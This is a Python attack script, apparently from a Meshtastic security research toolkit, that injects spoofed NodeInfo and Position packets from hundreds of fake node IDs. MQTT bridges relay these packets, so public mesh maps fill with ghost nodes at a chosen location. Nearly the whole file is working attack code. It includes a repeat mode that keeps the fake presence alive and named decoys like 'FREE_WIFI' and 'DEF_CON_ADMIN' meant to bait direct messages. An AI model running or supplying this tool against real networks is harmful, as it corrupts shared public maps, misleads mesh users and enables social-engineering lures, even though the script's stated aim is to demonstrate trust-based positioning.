#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "meshtastic",
# ]
# ///
"""
map_poison.py — Meshtastic MQTT bridge / mesh map poisoning

Injects NodeInfo + Position packets from many ghost node IDs, clustered
around a target coordinate. Mesh nodes with MQTT bridges relay these to
the internet, populating public Meshtastic maps (meshmap.net, etc.) with
hundreds of ghost nodes.

Demonstrates:
  - GPS coordinates are entirely trust-based; any node can claim any position
  - Ghost node IDs propagate to MQTT gateways and appear on internet-facing maps
  - A single evil node can flood a public map with fake presence data

Each ghost sends two packets:
  1. NODEINFO_APP  — establishes the node's identity in mesh NodeDB
  2. POSITION_APP  — announces the ghost node's (spoofed) location

Requires:
  - Evil firmware with EVIL_ALLOW_FROM_OVERRIDE=1

Usage:
    # 100 ghosts clustered at DEF CON / Caesars Forum
    python tools/map_poison.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --lat 36.1268 --lon -115.1745 --count 100

    # Larger scatter radius (0.01 deg ≈ 1 km)
    python tools/map_poison.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --lat 36.1268 --lon -115.1745 --radius 0.01 --count 200

    # Null Island — maximum confusion
    python tools/map_poison.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --lat 0.0 --lon 0.0 --count 50

    # Named ghosts to attract DM attempts (social engineering)
    python tools/map_poison.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --lat 36.1268 --lon -115.1745 --count 20 \\
        --names "FREE_WIFI,DEF_CON_ADMIN,PRIZE_WINNER,HRV_BOOTH,EVIL_NODE"

    # Continuous: re-announce all ghost nodes every 5 minutes
    python tools/map_poison.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --lat 36.1268 --lon -115.1745 --count 50 --repeat --interval 300
"""

import argparse
import math
import os
import random
import signal
import sys
import time

from common import add_connection_args, build_interface, evil_mode, print_banner


# Default ghost node name wordlists (mirrors nodedb_flood.py / firmware)
ADJECTIVES = [
    "Angry", "Brave", "Calm", "Dark", "Eerie", "Fast", "Grim", "Hasty",
    "Idle", "Jolly", "Keen", "Lazy", "Mean", "Noisy", "Odd", "Pale",
    "Quick", "Rusty", "Shady", "Tiny", "Ugly", "Vile", "Wily", "Xenon",
    "Yucky", "Zany", "Bleak", "Crisp", "Damp", "Dusty",
]
NOUNS = [
    "Node", "Ghost", "Relay", "Packet", "Mesh", "Ninja", "Rogue", "Shade",
    "Wraith", "Phantom", "Specter", "Shadow", "Demon", "Sprite", "Wanderer",
    "Lurker", "Stalker", "Drifter", "Nomad", "Exile",
]


def random_node_id(exclude: set) -> int:
    while True:
        nid = int.from_bytes(os.urandom(4), "little")
        if nid != 0 and nid != 0xFFFFFFFF and nid not in exclude:
            return nid


def ghost_name(node_id: int, custom_names: list[str] | None, index: int) -> tuple[str, str]:
    """Return (long_name, short_name) for a ghost node."""
    if custom_names and index < len(custom_names):
        long_name  = custom_names[index]
        short_name = long_name[:4].upper()
    else:
        adj        = ADJECTIVES[node_id % len(ADJECTIVES)]
        noun       = NOUNS[(node_id >> 8) % len(NOUNS)]
        long_name  = f"{adj} {noun} {node_id & 0xFFFF:04x}"
        short_name = f"{adj[:2]}{node_id & 0xFF:02x}"
    return long_name, short_name


def scatter_position(center_lat: float, center_lon: float,
                     radius_deg: float) -> tuple[float, float]:
    """Generate a random position uniformly distributed within radius_deg."""
    angle  = random.uniform(0, 2 * math.pi)
    dist   = random.uniform(0, radius_deg)
    lat    = center_lat + dist * math.cos(angle)
    # Correct longitude for latitude compression
    cos_lat = math.cos(math.radians(center_lat))
    lon    = center_lon + (dist * math.sin(angle) / cos_lat if cos_lat > 0 else 0)
    return lat, lon


def send_ghost_nodeinfo(iface, node_id: int, long_name: str, short_name: str,
                        channel: int, hop_limit: int):
    """Send a NODEINFO_APP packet appearing to come from node_id."""
    import meshtastic.protobuf.mesh_pb2 as mesh_pb2
    import meshtastic.protobuf.portnums_pb2 as portnums_pb2

    user = mesh_pb2.User()
    user.id         = f"!{node_id:08x}"
    user.long_name  = long_name[:36]
    user.short_name = short_name[:4]
    user.hw_model   = 0       # UNSET
    user.is_licensed = False

    packet = mesh_pb2.MeshPacket()
    setattr(packet, "from", node_id)
    packet.to        = 0xFFFFFFFF
    packet.channel   = channel
    packet.hop_limit = hop_limit
    packet.hop_start = hop_limit
    packet.want_ack  = False
    packet.decoded.portnum       = portnums_pb2.PortNum.NODEINFO_APP
    packet.decoded.payload       = user.SerializeToString()
    packet.decoded.want_response = False

    toRadio = mesh_pb2.ToRadio()
    toRadio.packet.CopyFrom(packet)
    iface._sendToRadio(toRadio)


def send_ghost_position(iface, node_id: int, lat: float, lon: float, alt: int,
                        channel: int, hop_limit: int):
    """Send a POSITION_APP packet appearing to come from node_id."""
    import meshtastic.protobuf.mesh_pb2 as mesh_pb2
    import meshtastic.protobuf.portnums_pb2 as portnums_pb2

    pos = mesh_pb2.Position()
    pos.latitude_i   = int(lat * 1e7)   # Meshtastic: 1e-7 degree units
    pos.longitude_i  = int(lon * 1e7)
    pos.altitude     = alt
    pos.precision_bits = 32             # full precision

    packet = mesh_pb2.MeshPacket()
    setattr(packet, "from", node_id)
    packet.to        = 0xFFFFFFFF
    packet.channel   = channel
    packet.hop_limit = hop_limit
    packet.hop_start = hop_limit
    packet.want_ack  = False
    packet.decoded.portnum  = portnums_pb2.PortNum.POSITION_APP
    packet.decoded.payload  = pos.SerializeToString()

    toRadio = mesh_pb2.ToRadio()
    toRadio.packet.CopyFrom(packet)
    iface._sendToRadio(toRadio)


def inject_ghost(iface, index: int, total: int, node_id: int,
                 long_name: str, short_name: str,
                 lat: float, lon: float, alt: int,
                 channel: int, hop_limit: int, nodeinfo_interval: float):
    """Send NodeInfo then Position for one ghost node, with a small gap."""
    send_ghost_nodeinfo(iface, node_id, long_name, short_name, channel, hop_limit)
    time.sleep(nodeinfo_interval)
    send_ghost_position(iface, node_id, lat, lon, alt, channel, hop_limit)


def main():
    parser = argparse.ArgumentParser(
        description="MQTT bridge / mesh map poisoning via ghost node position injection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("Usage:")[0].strip(),
    )
    add_connection_args(parser)

    # Target location
    loc_grp = parser.add_argument_group("Target location")
    loc_grp.add_argument("--lat",    type=float, required=True, help="Center latitude (decimal degrees)")
    loc_grp.add_argument("--lon",    type=float, required=True, help="Center longitude (decimal degrees)")
    loc_grp.add_argument("--alt",    type=int,   default=0,     help="Altitude in meters (default: 0)")
    loc_grp.add_argument("--radius", type=float, default=0.002,
                         help="Scatter radius in degrees (~200m at 0.002, default: 0.002)")

    # Ghost parameters
    ghost_grp = parser.add_argument_group("Ghost node options")
    ghost_grp.add_argument("--count",    type=int,   default=100,
                           help="Number of ghost nodes to inject (default: 100)")
    ghost_grp.add_argument("--names",    metavar="LIST",
                           help="Comma-separated list of custom long names (cycles if fewer than --count)")
    ghost_grp.add_argument("--interval", type=float, default=0.5,
                           help="Seconds between each ghost's NodeInfo+Position pair (default: 0.5)")
    ghost_grp.add_argument("--nodeinfo-gap", type=float, default=0.15,
                           help="Seconds between NodeInfo and Position sends per ghost (default: 0.15)")

    # Repeat mode
    ghost_grp.add_argument("--repeat", action="store_true",
                           help="Re-inject all ghosts in a loop (maintains presence against MQTT expiry)")
    ghost_grp.add_argument("--repeat-interval", type=float, default=300,
                           help="Seconds between repeat cycles (default: 300 = 5 min)")

    # Mesh options
    parser.add_argument("--channel",   type=int, default=0,            help="Channel index (default: 0)")
    parser.add_argument("--hop-limit", type=int, default=3, choices=range(0, 8),
                        metavar="{0..7}",                               help="Hop limit (default: 3)")

    args = parser.parse_args()

    if not evil_mode(args):
        print("[!] ERROR: --evil required. Map poisoning needs EVIL_ALLOW_FROM_OVERRIDE firmware.")
        sys.exit(1)

    custom_names = [n.strip() for n in args.names.split(",")] if args.names else None

    print("[*] Connecting...")
    iface = build_interface(args)
    time.sleep(2)
    info, own_id = print_banner(iface, args, "map_poison.py — MQTT bridge / map poisoning")

    exclude = {own_id, 0, 0xFFFFFFFF}

    # Pre-generate ghost node IDs and positions (stable across repeat cycles)
    ghosts: list[dict] = []
    for i in range(args.count):
        nid = random_node_id(exclude)
        exclude.add(nid)
        lat, lon = scatter_position(args.lat, args.lon, args.radius)
        long_name, short_name = ghost_name(nid, custom_names, i)
        ghosts.append({"id": nid, "lat": lat, "lon": lon,
                       "long_name": long_name, "short_name": short_name})

    eta_single = args.count * (args.interval + args.nodeinfo_gap)
    print(f"[*] Ghost count:  {args.count}")
    print(f"[*] Center:       ({args.lat:.6f}, {args.lon:.6f}), alt={args.alt}m")
    print(f"[*] Radius:       ±{args.radius:.4f}° (~{args.radius * 111320:.0f}m)")
    print(f"[*] Channel:      {args.channel}  hop_limit: {args.hop_limit}")
    print(f"[*] Repeat:       {'yes, every ' + str(args.repeat_interval) + 's' if args.repeat else 'no'}")
    print(f"[*] ETA (1 pass): ~{eta_single:.0f}s")
    if args.names:
        print(f"[*] Custom names: {args.names}")
    print()

    running   = True
    cycle     = 0
    total_sent = 0

    def handle_sigint(sig, frame):
        nonlocal running
        print(f"\n[*] Stopped. Sent {total_sent} NodeInfo+Position pairs.")
        running = False

    signal.signal(signal.SIGINT, handle_sigint)

    while running:
        cycle += 1
        cycle_start = time.time()
        sent_this_cycle = 0

        if args.repeat and cycle > 1:
            print(f"\n[*] Cycle {cycle} — re-announcing {args.count} ghost nodes")

        for i, ghost in enumerate(ghosts):
            if not running:
                break
            try:
                inject_ghost(
                    iface,
                    index=i, total=args.count,
                    node_id=ghost["id"],
                    long_name=ghost["long_name"],
                    short_name=ghost["short_name"],
                    lat=ghost["lat"], lon=ghost["lon"], alt=args.alt,
                    channel=args.channel,
                    hop_limit=args.hop_limit,
                    nodeinfo_interval=args.nodeinfo_gap,
                )
                sent_this_cycle += 1
                total_sent += 1
                elapsed = time.time() - cycle_start
                rate = sent_this_cycle / elapsed if elapsed > 0 else 0
                print(f"  [{sent_this_cycle:>4}/{args.count}] !{ghost['id']:08x}  "
                      f"'{ghost['long_name']}'  "
                      f"({ghost['lat']:.6f}, {ghost['lon']:.6f})  "
                      f"({rate:.2f}/s)", flush=True)
            except Exception as e:
                print(f"  [ERROR] !{ghost['id']:08x}: {e}")

            if running and i < len(ghosts) - 1:
                time.sleep(args.interval)

        cycle_elapsed = time.time() - cycle_start
        print(f"\n[*] Cycle {cycle} complete: {sent_this_cycle} pairs in {cycle_elapsed:.1f}s  "
              f"(total: {total_sent})")

        if not args.repeat:
            break

        if running:
            print(f"[*] Waiting {args.repeat_interval:.0f}s before next cycle (Ctrl+C to stop)...")
            wait_start = time.time()
            while running and (time.time() - wait_start) < args.repeat_interval:
                time.sleep(0.5)

    iface.close()


if __name__ == "__main__":
    main()
